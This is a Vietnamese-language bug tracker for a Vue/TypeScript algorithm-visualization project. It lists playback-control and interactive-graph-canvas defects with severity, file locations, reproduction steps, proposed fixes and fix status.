# 🐛 DATN_ERRORS — Sổ Tay Lỗi Dự Án VisualizationDSA

> Sổ tay này ghi lại **tất cả lỗi phát hiện** trong dự án kể từ ngày khởi tạo (2026-08-09).
> Mọi lỗi mới phát hiện trong tương lai phải được thêm vào đây trước khi sửa.
> Sau khi sửa xong, chuyển trạng thái `OPEN` → `FIXED` (kèm commit hash nếu có) — **không xóa dòng**.

---

## 📌 Quy Ước

| Trường | Ý nghĩa |
|---|---|
| **ID** | Mã lỗi duy nhất. Tiền tố: `EC` (Execution Control), `IP` (Interactive Playground), `PS` (Pseudocode Sync), `QZ` (Quiz System), `CC` (Cross-cutting), `BK` (Backend), `CV` (Code-to-Visualization), `DP` (Design Patterns & SOLID Docs) |
| **Severity** | `P0` = crash/sai kết quả/chống gian lận/feature chết · `P1` = lệch spec nghiêm trọng · `P2` = thiếu biên an toàn/UX · `P3` = vệ sinh/cải tiến |
| **Status** | `OPEN` = chưa sửa · `FIXED` = đã sửa (kèm bằng chứng) |
| **Vị trí** | `file:line` — dòng được ghi tại thời điểm phát hiện, có thể dịch chuyển sau khi sửa |
| **Kịch bản** | Các bước tái hiện lỗi |
| **Đề xuất** | Cách sửa cụ thể (tham khảo, chưa phải quyết định cuối cùng) |

---

# 1. 🔄 EXECUTION CONTROL (VCR Playback)

**Code scope:** `frontend/src/features/vcr-player/**`, `frontend/src/components/VcrControls.vue`, `frontend/src/features/animation-engine/**`, `frontend/src/features/algo-playground/engine/SortingAnimationEngine.ts`
**Spec:** `plan/features/deep-decomposition/phase1-execution-control/*.md`, `phase2-timeline-playback/*.md`

## 🔴 P0

### EC-001 — Scrub (kéo slider) khi đang Play không auto-pause → race giữa interval ticker và store mutation
- **Status:** OPEN
- **Vị trí:** `useVcrStore.ts:98` (`jumpToFrame`), `VcrDockBar.vue:97-99` (`handleScrub`)
- **Mô tả:** `jumpToFrame` chỉ gán `currentFrameIndex` mà không đặt `isPlaying=false`. Interval ticker (`setInterval(stepNext, 1000/speed)`) vẫn chạy nên frame bị ticker "đẩy tiếp" sau mỗi lần kéo — slider không thể "đỗ" đúng frame.
- **Lệch spec:** BEHAVIOR_SPEC phase1 §2 yêu cầu "Ngay khi phát hiện `@mousedown` trên slider, hệ thống kích hoạt `pause()`". Bên `useAnimationStore.ts:175-181` (`scrubTo`) đã làm đúng, `useVcrStore` thì không.
- **Kịch bản:** SortingView → Play → kéo slider đến frame 20 → vừa nhả chuột, ticker nhảy tiếp 21, 22...
- **Đề xuất:** Trong `jumpToFrame` thêm `isPlaying.value = false;`, đăng ký `@mousedown="vcrStore.pause()"` trên `<input type="range">`.

### EC-002 — Step Forward/Backward không ép PAUSE khi đang phát
- **Status:** OPEN
- **Vị trí:** `useVcrStore.ts:89-96` (`stepNext`/`stepPrev`)
- **Mô tả:** Step chỉ tăng/giảm index, không dừng ticker → giữ phím `→` khi đang play mỗi giây nhảy 1-2 frame ngoài ý muốn, không xem được frame tĩnh.
- **Lệch spec:** BEHAVIOR_SPEC phase1 §3: bấm Step phải "ép động cơ dừng lại (`pause()`)". `useAnimationStore.ts:156,168` đã đúng.
- **Kịch bản:** Play → giữ ArrowRight (SortingView.vue:86 gọi stepNext trực tiếp) → frame tăng loạn.
- **Đề xuất:** Thêm `isPlaying.value = false;` đầu `stepNext` và `stepPrev`.

### EC-003 — Nút Play "chết" ở frame cuối — thiếu Replay ↩
- **Status:** ✅ FIXED — 2026-08-09 (phần UI VcrDockBar: icon `refresh-cw` + title "Phát lại từ đầu" khi `isAtEnd`; store-side togglePlay do agent khác xử lý)
- **Vị trí:** `useVcrStore.ts:79-87` (`play`/`togglePlay`), `VcrDockBar.vue:36-47`
- **Mô tả:** Ở frame cuối (`isAtEnd`), bấm Play → `isPlaying=true` → tick đầu gọi `stepNext` thấy hết frame & không loop → `isPlaying=false` ngay. Không gì xảy ra, icon vẫn ▶. Không có nút Replay trong VcrDockBar.
- **Lệch spec:** PRD §3.1: "Nút Replay [↩] xuất hiện tự động khi chạy đến khung hình cuối cùng để phát lại nhanh từ Frame 0"; `03-state-management.md` §2 mô tả handler `if (isFinished) { goToFrame(0); play(); }`.
- **Đề xuất:** Trong `togglePlay`: `if (isAtEnd) { currentFrameIndex = 0; isPlaying = true; }`; đổi icon sang `refresh-cw` khi `isAtEnd`.

## 🟠 P1

### EC-004 — Nút Play no-op ở frame cuối trong animation store (chỉ hotkey xử lý đúng)
- **Status:** OPEN
- **Vị trí:** `useAnimationStore.ts:65-71` (`play` early-return khi `isFinished`), `DSAPlayer.vue:59`, `InteractivePlayground.vue:206`
- **Mô tả:** `play()` trả về sớm khi `isFinished` → bấm nút Play giữa màn hình không làm gì. Hotkey `usePlaybackHotkeys.ts:20-25` đã xử lý replay đúng nhưng nút bấm thì không.
- **Lệch spec:** PRD §3.1. Test `useAnimationStore.spec.ts:188` đang "đóng băng" hành vi sai này thành kỳ vọng.
- **Đề xuất:** Dùng chung handler trong `togglePlay()`: `if (isFinished) { goToFrame(0); play(); }`.

### EC-005 — Thiếu click debounce 100ms cho nút step (useVcrStore)
- **Status:** OPEN
- **Vị trí:** `useVcrStore.ts:89-96`; so sánh `useAnimationStore.ts:9,151-173` (`STEP_DEBOUNCE_MS=100`)
- **Mô tả:** Spam click/keydown bước tăng index ngay lập tức; kết hợp EC-002 khi đang play index nhảy loạn.
- **Lệch spec:** phase2 §3: "Các lượt bấm spam trong khoảng trễ 100ms bị loại bỏ".
- **Đề xuất:** `let lastStepTime = -100;` + guard `performance.now() - lastStepTime < 100`.

### EC-006 — `playbackSpeed` không clamp → interval Infinity/NaN kẹt hoặc quét frames với tốc độ hàng nghìn fps
- **Status:** OPEN
- **Vị trí:** `useVcrStore.ts:103` (`setInterval(stepNext, 1000 / playbackSpeed.value)`), `useAnimationStore.ts:183-189` (`setSpeed`)
- **Mô tả:** `playbackSpeed` là ref public, không guard: speed=0 → `1000/0=Infinity` → interval bị clamp ~2³¹ms → UI hiện "đang phát" nhưng không bao giờ advance; speed=NaN → interval ~1ms → nghẽn CPU.
- **Lệch spec:** phase2 §2 giới hạn 0.1x–5.0x.
- **Đề xuất:** Clamp `Math.min(5, Math.max(0.1, playbackSpeed.value))` + guard `isFinite`.

### EC-007 — Option tốc độ 10x vượt phạm vi spec (max 5.0x)
- **Status:** ✅ FIXED — 2026-08-09 (2 nơi dùng chung `SPEED_PRESETS = [0.1, 0.25, 0.5, 1, 1.5, 2, 4, 5]`, bỏ 10x)
- **Vị trí:** `AnimationVcrControls.vue:38-42` (dropdown `0.5/1/2/5/10x`)
- **Mô tả:** 10x vượt cả phase2 (5.0x) lẫn PRD phase1 (4.0x); thiếu các mốc 0.1/0.25/1.5/4.0 có trong `SPEED_PRESETS` (`executionControl.spec.ts:23`).
- **Đề xuất:** Đồng bộ options với `SPEED_PRESETS = [0.1, 0.25, 0.5, 1, 1.5, 2, 4, 5]`.

### EC-008 — `SortingAnimationEngine.loop` chạy rAF 60FPS vô điều kiện kể cả khi PAUSED (hao CPU thường trực)
- **Status:** OPEN
- **Vị trí:** `frontend/src/features/algo-playground/engine/SortingAnimationEngine.ts:102-122`
- **Mô tả:** `pause()` (dòng 96) chỉ gán `_playing=false`, loop vẫn `requestAnimationFrame` mỗi 60 lần/s bỏ qua toàn bộ phần vẽ — đốt CPU/GPU suốt thời gian workspace tồn tại (PlaygroundView/LessonStepViz là route production).
- **Kịch bản:** Mở `/playground` chế độ algo, không bấm Play → Performance ghi rAF liên tục 60FPS, laptop bật quạt.
- **Đề xuất:** Thêm `_running` flag: chỉ schedule khi `_playing || progress > 0`; `pause()`/kết thúc transition → `cancelAnimationFrame`.

### EC-009 — (Latent) `useAnimationCanvas`: thuật toán khớp bar O(n²) + cấp phát object mỗi frame trong `draw()`
- **Status:** ✅ FIXED — 2026-08-10 (`buildPrevSnapshotLookup`: Map `byKey=(sourceIndex:value)` + `byValue` dựng 1 lần/frame → O(1)/bar thay vì `findPrevSnapshotForBar` O(n²); bỏ `shadowBlur=15` per-bar cho MỌI sorted bar → globalAlpha 0.35 overlay, giữ shadowBlur 12 chỉ cho swap bar; cache font/align/textAlign + chuỗi fillText ngoài vòng lặp)
- **Vị trí:** `frontend/src/features/animation-engine/composables/useAnimationCanvas.ts:39-55,102,136-148`
- **Mô tả:** `findPrevSnapshotForBar` quét ngược snapshot cho từng bar → O(n²)/frame; `buildBarSnapshot` tạo mảng object mới 60 lần/s; `ctx.shadowBlur=15/12` fill 2 lần cho mọi bar (shadowBlur là phép toán đắt nhất canvas). Vi phạm Quy tắc 3 Data-Driven: logic khớp mảng nằm trong hàm render.
- **Kịch bản:** Khi feature được mount (hiện chưa có route dùng), sorting 200 phần tử → FPS tụt < 30.
- **Đề xuất:** Chuyển mapping `sourceIndex` sang `Map` tính trước ngoài draw loop; bỏ shadowBlur per-bar; cache `fillText`.

## 🟡 P2

### EC-010 — `isAtEnd` dùng `>=` + gán `playbackFrames=[]` không reset index → cửa sổ index vượt biên
- **Status:** OPEN
- **Vị trí:** `useVcrStore.ts:52`, `CodeEditor.vue:138` (`vcrStore.playbackFrames = []`)
- **Mô tả:** User ở frame 10/50 → CodeEditor xóa frames nhưng không reset `currentFrameIndex` → `isAtEnd = 10 >= -1 = true` (nút Next disabled sai), counter hiển thị `11/0`.
- **Lệch spec:** phase2 §1 yêu cầu Clamp(Index, 0, totalSteps-1) ở mọi truy xuất.
- **Đề xuất:** (a) `isAtEnd` dùng `===`; (b) `watch(playbackFrames, ...)` tự heal index; (c) mọi nơi gán frames kèm reset (mẫu đúng: `useSortingAnimation.ts:82-83`).

### EC-011 — `compileAndLoad` nhánh `customCompileFn` không đặt `isPlaying = false`
- **Status:** OPEN
- **Vị trí:** `useVcrStore.ts:61-64`
- **Mô tả:** Đang play dataset cũ, gọi `compileAndLoad()` với `customCompileFn` đang trỏ → dataset mới **tự động phát ngay** (lệch BEHAVIOR_SPEC §4: nút phát phải về trạng thái Play).
- **Đề xuất:** Đặt `isPlaying.value = false;` trước `if (customCompileFn.value)`.

### EC-012 — Test P0 đọc text nguồn component "chết" thay vì mount (pass giả)
- **Status:** OPEN
- **Vị trí:** `vcrPlayerP0Tests.spec.ts:151-160`
- **Mô tả:** Test dùng `fs.readFileSync` assert chuỗi `:disabled="currentIndex >= totalFrames - 1"` trong `VcrControls.vue` — component không được view nào mount (dead code), assert chuỗi không chứng minh hành vi thật. Nút Next thật (`VcrDockBar.vue:52`) dùng điều kiện khác.
- **Đề xuất:** Viết lại test mount `VcrDockBar.vue` + pinia, assert `disabled` attribute thật.

### EC-013 — Thiếu `@mousedown` pause + throttle 30FPS cho scrub theo spec
- **Status:** ✅ FIXED — 2026-08-09 (`@mousedown="vcrStore.pause()"` + throttle 33ms tự viết bằng `performance.now`)
- **Vị trí:** `VcrDockBar.vue:74-83`
- **Mô tả:** Slider chỉ có `@input`; kéo slider phát ~60+ input events/s, mỗi lần set index + re-render canvas → nguồn jank chính (kết hợp EC-001). Spec `01-core-logic.md:36-47` yêu cầu `useThrottleFn` 33ms.
- **Đề xuất:** Thêm `@mousedown` pause + throttle 33ms cho `handleScrub`.

### EC-014 — Scrubber VcrDockBar mất núm kéo + mất fill tiến trình (CSS)
- **Status:** ✅ FIXED — 2026-08-09 (style block `.vcr-scrubber`: thumb 20px trắng viền #06B6D4 + gradient fill theo `--scrub-progress`)
- **Vị trí:** `VcrDockBar.vue:82` (`appearance-none`), toàn repo không có `::-webkit-slider-thumb` cho `.vcr-scrubber`
- **Mô tả:** Dải trượt hiện đường xám phẳng, không thumb, không fill cyan — user không thấy vị trí đang phát. `accent-accent` vô hiệu vì mất appearance gốc. Lệch spec phase2 §2 (knob trắng + fill neon).
- **Đề xuất:** Bỏ `appearance-none` hoặc thêm CSS thumb + `background: linear-gradient(to right, #06B6D4 p%, transparent p%)`. Lỗi tương tự ở `ArrayBarVisualizer.vue:37`.

### EC-015 — AnimationVcrControls (DSAPlayer/Playground) không có disabled states + counter "1/0"
- **Status:** ✅ FIXED — 2026-08-09 (disabled stepBack/stepForward/cả 4 nút+slider khi `totalSteps === 0`, counter `0 / 0`)
- **Vị trí:** `AnimationVcrControls.vue:3-18,45-47`
- **Mô tả:** Ở frame 0 nút Step Back vẫn sáng (click no-op im lặng); trước khi execute cả 4 nút + slider "sống"; counter hiển thị `1/0` khi chưa có data.
- **Đề xuất:** Truyền props `isUninitialized/isFirstFrame/isLastFrame`, bind `:disabled`; hiển thị `0/0` khi `totalSteps === 0`.

### EC-016 — Interval của useVcrStore không tôn trọng `document.hidden`
- **Status:** OPEN
- **Vị trí:** `useVcrStore.ts:101-105`
- **Mô tả:** Chuyển tab 1 phút khi đang play → playback nhảy hết frame, CPU chạy nền vô ích. `useAnimationStore.ts:273-281` đã có `visibilitychange` listener.
- **Đề xuất:** Thêm `visibilitychange` → `pause()` khi hidden (hoặc chuyển sang rAF).

### EC-017 — `destroy()` gỡ vĩnh viễn listener `visibilitychange` của store singleton
- **Status:** OPEN
- **Vị trí:** `useAnimationStore.ts:266-281`, `VisualizationPlayer.vue:96-99`
- **Mô tả:** Pinia cache store theo id — listener đăng ký 1 lần; `destroy()` removeEventListener không có cơ chế đăng ký lại → rời view 1 lần là mất vĩnh viễn tính năng auto-pause khi ẩn tab.
- **Đề xuất:** Counted registration hoặc chuyển listener vào composable theo lifecycle component.

### EC-018 — PlaygroundCanvas: vòng lặp idle vẽ full-graph 12.5FPS mãi mãi
- **Status:** ✅ FIXED — 2026-08-10 (dirty-flag render loop: loop chỉ chạy khi busy/physics chưa hội tụ; khi `isStable(energy)` vẽ 1 frame cuối rồi dừng hẳn, redraw qua `markDirty()`; bỏ idleTimer 80ms)
- **Vị trí:** `PlaygroundCanvas.vue:184-204`
- **Mô tả:** Khi rảnh, mỗi 80ms vẫn `draw()` toàn bộ đồ thị — CPU/GPU thường trực dù không có gì đổi. `ForceDirectedEngine.isStable()` không được gọi ở runtime.
- **Đề xuất:** Dirty flag hoặc dùng `isStable(energy)` → vẽ 1 frame cuối rồi ngừng hẳn, redraw khi có thay đổi.

### EC-019 — Re-render churn khi hover slider (tooltip)
- **Status:** OPEN
- **Vị trí:** `useSliderTooltip.ts:20-40`, `AnimTimelineSlider.vue:16-19`
- **Mô tả:** Mỗi `mousemove` tạo object tooltip mới → re-render toàn bộ AnimControlPanel + `parseEmojiToSvg` lại ở 60-120Hz + `getBoundingClientRect()` mỗi event.
- **Đề xuất:** Throttle bằng rAF, cache kết quả parse, hoặc tách tooltip component riêng.

### EC-020 — `useThrottledScrub` tên "Throttled" nhưng không throttle
- **Status:** OPEN
- **Vị trí:** `useThrottledScrub.ts:8-21`
- **Mô tả:** `scrubTo` gọi thẳng ở tần suất input 60-120Hz, mỗi lần `pause()` + set index + re-render HUD.
- **Đề xuất:** Throttle rAF/debounce 16ms trong `updateScrubPosition`.

### EC-021 — `AnimTimelineSlider` kẹt `isScrubbing=true` khi thả chuột ngoài slider
- **Status:** OPEN
- **Vị trí:** `AnimTimelineSlider.vue:12-13` (chỉ `mouseup`/`touchend`)
- **Đề xuất:** Thêm `@mouseleave` → `scrubEnd`.

### EC-022 — `Math.max(...frame.dataState)` spread tràn stack với mảng lớn
- **Status:** OPEN
- **Vị trí:** `BarChartRenderer.vue:89`, `SortingAnimationEngine.ts:157-158`
- **Đề xuất:** Dùng `reduce`/`for` khi n lớn.

### EC-023 — `watch(..., {deep:true})` trên frame plain object (shallowRef) — tốn phí duyệt cây
- **Status:** OPEN
- **Vị trí:** `BarChartRenderer.vue:125`, `GraphRenderer.vue:484`
- **Đề xuất:** Bỏ `deep`, chỉ watch identity (frame mới = object mới).

### EC-024 — Lỗi biên dịch dùng `alert()` native chặn UI
- **Status:** OPEN
- **Vị trí:** `useVcrStore.ts:82-84`
- **Đề xuất:** Thay bằng toast (hệ thống toastStore đã có).

### EC-025 — Phím tắt không chặn `e.repeat` — giữ phím Space toggle rung nhấp nháy
- **Status:** ✅ FIXED — 2026-08-09 (`e.repeat` guard cho Space/R tại `usePlaybackHotkeys.ts`, `useDSAKeyboard.ts`, `SortingView.vue`; Arrow giữ repeat)
- **Vị trí:** `SortingView.vue:73-97`, `useDSAKeyboard.ts:12-38`, `usePlaybackHotkeys.ts:17-56`
- **Đề xuất:** `if (e.repeat) return;` cho Space/R; Arrow cho phép repeat nhưng debounce 100ms.

### EC-026 — VcrDockBar bị cắt xén (clipping) trên viewport < ~500px
- **Status:** OPEN
- **Vị trí:** `VcrDockBar.vue:2` (`overflow-hidden`), `SortingView.vue:44-52`
- **Đề xuất:** `flex-wrap` 2 hàng ở `sm` breakpoint.

## 🟡 P3 (nhỏ, tổng hợp)

| ID | Vị trí | Nội dung |
|---|---|---|
| EC-027 | `VcrDockBar.vue:43` | Title nút play tĩnh "Phát / Tạm dừng" không phản ánh trạng thái (VcrButtonsRow đã làm đúng) — ✅ FIXED 2026-08-09 (title/aria-label động theo isPlaying/isAtEnd) |
| EC-028 | `AnimationVcrControls.vue:3-18` | Nút icon-only thiếu `aria-label` (VcrDockBar đã có đầy đủ) — ✅ FIXED 2026-08-09 |
| EC-029 | `VcrDockBar.vue:84-86` | Counter không `aria-live` cho screen reader — ✅ FIXED 2026-08-09 (cả 2 component) |
| EC-030 | `SortingView.vue:24` | Phím tắt `R: Reset` không được liệt kê trong hướng dẫn — ✅ FIXED 2026-08-09 |
| EC-031 | `VcrDockBar.vue:2` | Lệch visual phase2 §1: dùng `rounded-lg` thay vì kén nhộng `border-radius: 9999px` + glass — ✅ FIXED 2026-08-09 (`rounded-full bg-slate-900/45 backdrop-blur`) |
| EC-032 | `src/components/VcrControls.vue` (113 dòng) | **Dead code** — không view nào import; xóa hoặc nâng cấp |
| EC-033 | `useAnimationStore.ts:58-63` | `loadResult` không reset `loopEnabled` — dataset mới kế thừa loop của dataset cũ |
| EC-034 | `useAnimationStore.ts:199-224` vs `151-161` | `stepForward` khi đang `playUntilFrame` → promise `playUntilTarget` treo (latent, chưa có caller production) |
| EC-035 | `useAnimationStore.ts:46-49` | `progressPercent` = 0 khi `frames.length <= 1` — dataset 1 frame không bao giờ 100% |
| EC-036 | `SortingView.vue:73-97` | Hotkey không check `interactionLocked`/E-Lecture (ngược `usePlaybackHotkeys.ts:15`) — ✅ FIXED 2026-08-09 |
| EC-037 | `useVcrStore.ts:38` (`isLooping`) | Dead flag — không có UI toggle, chỉ test động vào |
| EC-038 | `useVcrStore.ts:97,105` | `reset()` không `stopTimer()` trực tiếp, trông cậy watcher flush 'pre' → cửa sổ hiếm: 1 tick cuối chạy sau reset |
| EC-039 | `vcrPlayerP0Tests.spec.ts` | Không dùng fake timers — `play()` khởi động `setInterval` thật → nondeterministic + interval leak giữa test |
| EC-040 | `vcrPlayerP0Tests.spec.ts` | Lõi ticker (advance frame/pause/speed change) chưa có test nào |
| EC-041 | `AnimControlPanel.vue` | Component đích của spec (E-Lecture lock, replay, clamp speed) — **0 test** |
| EC-042 | `useVcrStore.ts:82-84,71-76` | Nhánh lỗi biên dịch + catch của `compileAndLoad` chưa test |
| EC-043 | `useVcrStore.ts:98` | `jumpToFrame` OOB (âm/vượt) chưa test |
| EC-044 | `executionControl.spec.ts:22-24` | Test pin `SPEED_PRESETS=[0.1..5.0]` trái PRD/README (0.25→4.0) — drift doc↔code được test "đóng băng" |
| EC-045 | `useVcrStore.ts:105` | `watch([isPlaying, playbackSpeed])` không được dispose khi store thải hồi |
| EC-046 | `vcrPlayerP0Tests.spec.ts:152-153` | `require('fs')`/`require('path')` trong file TS ESM — path resolve mong manh |
| EC-047 | `VisualizationPlayer.vue` / `CanvasLayer.vue` / `AnimControlPanel` | Toàn bộ cụm player này chưa được mount ở route production (chỉ test) — xem thêm PS-002 |

---

# 2. 🕸️ INTERACTIVE PLAYGROUND

**Code scope:** `frontend/src/features/interactive-playground/**`, `frontend/src/views/graph/GraphView.vue`
**Spec:** `plan/features/deep-decomposition/phase1-interactive-playground/*.md`

## 🔴 P0

### IP-001 — Import JSON không validate tọa độ → NaN vào canvas → đồ thị "chết" vĩnh viễn
- **Status:** OPEN
- **Vị trí:** `GraphParser.ts:56-58` (`Number(r.x)`, `Number(r.y)`)
- **Mô tả:** Node thiếu `x`/`y` hoặc `x:"abc"` → `NaN` đưa thẳng vào store. Canvas `ctx.arc(NaN,...)` (node biến mất); `ForceDirectedEngine.ts:20` `Math.hypot(NaN)` → NaN lan toả toàn bộ vận tốc → đồ thị rung vô hạn; `JSON.stringify({x:NaN})` → `null` làm hỏng export round-trip.
- **Kịch bản:** Import JSON hợp lệ cấu trúc nhưng node thiếu field `x`.
- **Đề xuất:** Trong `importFromJSON`: reject/filter `Number.isFinite(x) && Number.isFinite(y)` kèm toast lỗi cụ thể.

### IP-002 — (trùng lỗi với IP-003 về validation tổng) — xem IP-003

## 🟠 P1

### IP-003 — Import bypass toàn bộ validation: trọng số âm lọt vào Dijkstra, >30 nodes, label trùng, dangling edge
- **Status:** OPEN
- **Vị trí:** `GraphParser.ts:52-68` + `InteractivePlayground.vue:317-318` (`store.nodes.push(...result.nodes)`)
- **Mô tả:** `Number(-5) || 1` → `-5` lọt vào (truthy); `0` bị âm thầm đổi thành `1`; `String(r.id)` khi thiếu → `"undefined"` cho mọi node (id/label trùng, adjacencyList ghi đè key); edge trỏ node không tồn tại được giữ; không giới hạn ≤30 node; import không qua action store nên mọi ràng buộc của `addNode`/`addEdge` bị vô hiệu.
- **Kịch bản:** Import JSON weight `-7` → chạy Dijkstra → dist sai; import 40 nodes → vượt trần.
- **Lệch spec:** BEHAVIOR_SPEC §1 (max 30), PRD §3.1 (weight dương).
- **Đề xuất:** Thêm action store `importGraph(nodes, edges)` — validate (≤30 node, id/label unique, x/y finite, edge endpoints tồn tại, weight 1..999), trả lỗi chi tiết; component chỉ gọi action + toast.

### IP-004 — Chế độ Directed không vẽ được cặp cạnh hai chiều A→B + B→A
- **Status:** OPEN
- **Vị trí:** `usePlaygroundStore.ts:57-62` (`addEdge` chặn cặp đảo vô điều kiện, không nhận `graphType`)
- **Mô tả:** `GraphAlgorithmSimulator.resolveNeighbor` (`GraphAlgorithmSimulator.ts:105-115`) đã hỗ trợ directed nhưng store không cho tạo dữ liệu đó.
- **Kịch bản:** Bật "Directed" → kéo A→B → kéo B→A → bị từ chối im lặng.
- **Đề xuất:** Thêm tham số `graphType` vào `addEdge`, chỉ chặn cặp đảo khi undirected; nối từ `PlaygroundCanvas.onMouseUp`.

### IP-005 — Quy tắc "đồ thị phải liên thông" (BEHAVIOR_SPEC §2.2) không được thực thi
- **Status:** ✅ FIXED — 2026-08-10 (phần component: `runSimulation` gọi `GraphParser.findIsolatedNodes` trước khi simulate với DIJKSTRA, chặn + toast lỗi liệt kê đỉnh cô lập; phần nhấp nháy đỏ trên Canvas cần cờ store `isolatedNodeIds` — TODO cho agent store)
- **Vị trí:** `GraphParser.ts:27-46` (`findIsolatedNodes` là dead code — chỉ test dùng), `InteractivePlayground.vue:340-361` (`runSimulation`)
- **Mô tả:** Chạy simulate ngay không chặn, không nhấp nháy đỉnh cô lập, không toast.
- **Đề xuất:** Trong `runSimulation`, với DIJKSTRA (và Prim theo spec): nếu có đỉnh cô lập → chặn + toast + đánh dấu đỉnh đó.

### IP-006 — Clamp kéo-thả node dùng view-space áp lên world-space → node không kéo tới được nửa màn hình khi zoom
- **Status:** ✅ FIXED — 2026-08-10 (helper chung `GraphGeometryEngine.worldBoundsFromViewport` + `clampPointToBounds`: `minX = -pan.x/zoom + 20; maxX = (width - pan.x)/zoom - 20`; `handleMouseMove` nhận thêm zoom/pan)
- **Vị trí:** `canvasEventHandlers.ts:106-107`, `PlaygroundCanvas.vue:108`
- **Mô tả:** `pos` từ `getMousePos` đã chia zoom/trừ pan, nhưng `width/height` truyền vào là CSS px thô → zoom 0.5: node dừng ở giữa màn hình; zoom 2 + pan: node bay khỏi view không giới hạn.
- **Đề xuất:** Clamp trong world-space: `minX = -pan.x/zoom + 20; maxX = (width - pan.x)/zoom - 20` (tương tự Y).

### IP-007 — Hover highlight là dead code — `setHoveredNodeId`/`setHoveredEdgeId` không bao giờ được gọi
- **Status:** ✅ FIXED — 2026-08-10 (`handleMouseMove` khi không drag/không vẽ cạnh: node ưu tiên thắng edge, set hover theo biến đổi; `onPointerLeave` clear cả 2)
- **Vị trí:** `PlaygroundCanvas.vue:159-160`, `playgroundCanvasDraw.ts:59-66,139-144`; setter chỉ có trong store/test
- **Mô tả:** Di chuột lên node/cạnh không có glow/đổi màu.
- **Đề xuất:** Trong `handleMouseMove` (không drag, không add-edge): `store.setHoveredNodeId(hitTestNode(...)?.id ?? null)` + clear khi rời.

### IP-008 — Xung đột 2 handler phím tắt trên `window` (GraphView + InteractivePlayground)
- **Status:** ✅ FIXED — 2026-08-10 (bỏ handler GraphView — InteractivePlayground.vue là nguồn hotkey duy nhất, đã có guard `isAlgorithmMode` + confirm xóa node/edge)
- **Vị trí:** `GraphView.vue:299-307` vs `InteractivePlayground.vue:386-407` (cả hai đăng ký `window.addEventListener('keydown')`)
- **Mô tả:** Nhấn `Delete` khi đang chọn node → GraphView chuyển mode DELETE **đồng thời** InteractivePlayground xoá node. GraphView không guard `isAlgorithmMode`.
- **Đề xuất:** Giữ 1 nguồn hotkey duy nhất (bỏ handler còn lại hoặc truyền qua props) + guard `isAlgorithmMode`.

### IP-009 — `deleteNode` không dọn `selectedEdgeId` — selection stale sau cascade delete
- **Status:** OPEN
- **Vị trí:** `usePlaygroundStore.ts:74-80` (so `deleteEdge:82-86`, `clearAll:88` đều dọn)
- **Đề xuất:** Thêm `selectedEdgeId.value = null;` trong `deleteNode`.

### IP-010 — Tạo cạnh "ma" khi kéo thả rời khỏi Canvas (mouseleave = mouseup)
- **Status:** ✅ FIXED — 2026-08-10 (bỏ `@mouseleave="onMouseUp"`; đăng ký `pointerup`/`pointercancel` trên window khi bắt đầu interaction — chỉ commit addEdge khi release trong canvas, ngoài canvas thì hủy)
- **Vị trí:** `PlaygroundCanvas.vue:12` (`@mouseleave="onMouseUp"`) + `:111-118`
- **Mô tả:** ADD_EDGE: kéo A → lướt qua B (snapTarget=B) → kéo ra ngoài canvas → `mouseleave` kích hoạt `onMouseUp` → `addEdge(A,B)` dù chưa nhả chuột.
- **Đề xuất:** Chỉ commit edge khi `mouseup` thật trên canvas (đăng ký `mouseup` ở `window`, kiểm tra toạ độ).

### IP-011 — Dijkstra: explanation in giá trị dist SAI (giá trị mới thay vì cũ)
- **Status:** ✅ FIXED — 2026-08-10 (`oldDist = dist[neighborId]` capture trước lệnh gán; explanation hiển thị giá trị cũ "5 < dist[B] (10)"; frame "xét cạnh" đã xuất distances pre-update)
- **Vị trí:** `GraphAlgorithmSimulator.ts:410-418` (`dist[neighborId] = alt` ở :411 trước khi đọc ở :418)
- **Mô tả:** Người học thấy "Khoảng cách mới 5 < dist[B] (5)" thay vì "(10)" — dữ liệu frame mâu thuẫn chính nó.
- **Đề xuất:** `const oldDist = dist[neighborId];` trước lệnh gán, dùng `oldDist` trong explanation.

### IP-012 — Thiếu hoàn toàn DPI/Retina (vi phạm skill canvas-rendering-engine.md)
- **Status:** ✅ FIXED — 2026-08-10 (`canvas.width = w*dpr; canvas.height = h*dpr; ctx.setTransform(dpr,0,0,dpr,0,0)` trong draw/resize; bỏ binding `:width/:height` template; popover weight bỏ tỉ lệ `rect.width/canvas.width`; `getMousePos` giữ nguyên — tỉ lệ `c.width/r.width` đã tự đúng với DPR)
- **Vị trí:** `PlaygroundCanvas.vue:5-6,137-166` — không có `ctx.setTransform(dpr, ...)`
- **Mô tả:** Trên máy HiDPI (dpr=2): text nhãn, grid, viền mờ nhòe. May: `getMousePos` (:78-79) và popover weight đã nhân tỉ lệ `c.width/r.width` nên tương thích sẵn.
- **Đề xuất:** `canvas.width = w*dpr; canvas.height = h*dpr; ctx.setTransform(dpr,0,0,dpr,0,0)`.

### IP-013 — Snap distance (40px) và hit-test edge (8px) tính theo world → vỡ UX khi zoom
- **Status:** ✅ FIXED — 2026-08-10 (`isWithinSnapDistance` + `hitTestEdge` nhận param `zoom`, threshold quy đổi screen `threshold/zoom` tối thiểu 5px)
- **Vị trí:** `canvasEventHandlers.ts:117` (snap), `:67,86` + `GraphGeometryEngine.ts:15` (threshold 8)
- **Mô tả:** Zoom 0.2 → snap chỉ còn 8px screen (không hút), edge gần như không bấm được; zoom 3 → snap 120px screen hút nhầm.
- **Đề xuất:** `threshold / zoom` (tối thiểu 5px), hit-test ở screen-space.

### IP-014 — Không có touch/pointer events — thiết bị cảm ứng không dùng được
- **Status:** ✅ FIXED — 2026-08-10 (Pointer Events `pointerdown/move/up/cancel/leave` + `setPointerCapture` + CSS `touch-action:none`; giữ nguyên hành vi chuột; single pointer touch hoạt động; pinch zoom TODO)
- **Vị trí:** `PlaygroundCanvas.vue:9-13` (chỉ mousedown/mousemove/mouseup/mouseleave/wheel)
- **Đề xuất:** Thống nhất Pointer Events (`pointerdown/move/up/cancel` + `setPointerCapture`), CSS `touch-action: none`.

### IP-015 — Zoom bị trễ ~80ms và giật (không nằm trong `busy` list của render loop)
- **Status:** ✅ FIXED — 2026-08-10 (`onWheel` gọi `markDirty()` ngay; render loop dirty-flag vẽ tức thì, bỏ idle timer 80ms)
- **Vị trí:** `PlaygroundCanvas.vue:120-133` (onWheel) + `:190-203`
- **Đề xuất:** Thêm cờ "transform dirty" vào điều kiện `busy`, hoặc bỏ idle timer giữ rAF liên tục.

### IP-016 — Physics clamp quên trừ `panOffset` (chỉ chia zoom)
- **Status:** ✅ FIXED — 2026-08-10 (`ForceDirectedEngine.tick` nhận optional `worldBounds`; PlaygroundCanvas truyền `GraphGeometryEngine.worldBoundsFromViewport(..., pan, zoom, 0)` — dùng chung helper với IP-006)
